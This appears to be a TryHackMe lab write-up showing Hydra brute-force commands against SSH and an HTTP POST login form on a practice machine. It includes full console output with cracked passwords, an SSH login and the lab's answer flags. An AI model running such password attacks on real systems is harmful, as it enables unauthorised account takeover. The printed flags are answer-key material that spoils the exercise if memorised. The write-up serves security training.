# Hydra Commands

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

```hydra -l user -P passlist.txt ftp://192.168.0.1```

For the purpose of this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).
## SSH

```hydra -l <username> -P <full path to pass> <ip> -t 4 ssh```
[-h](https://i.imgur.com/D71vkKM.png)

```console
kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 -t 4 ssh
Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 12:51:58
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.39.3:22/
[22][ssh] host: 10.10.39.3   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 12:52:51
kali@kali:~$ ssh molly@10.10.39.3
The authenticity of host '10.10.39.3 (10.10.39.3)' can't be established.
ECDSA key fingerprint is SHA256:CvZ/M3lLX1Nv/BtNNW9Cb+JYa2z85ldNGQdNp0HwQ9U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.39.3' (ECDSA) to the list of known hosts.
molly@10.10.39.3's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-39-3:~$ ls
flag2.txt
molly@ip-10-10-39-3:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```
flag = ```THM{c8eeb0468febbadea859baeb33b2541b}```


## Post Web Form

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, of simply view the source code.

Below is an example Hydra command to brute force a POST login form:

```hydra -l  -P  <ip> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V```

- [-h](https://i.imgur.com/vC3ZU4E.png)
- [check this to understand how to use it](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)



```console
kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 13:09:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.39.3:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[80][http-post-form] host: 10.10.39.3   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 13:09:29
```
```html
<body>

    <div class="jumbotron text-center">
      <h1>THM{2673a7dd116de68e85c48ec0b1f2612e}</h1>
    </div>

    <script src="/js/jquery.slim.min.js"></script>
    <script src="/js/popper.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</body>
```

flag = ```THM{2673a7dd116de68e85c48ec0b1f2612e}```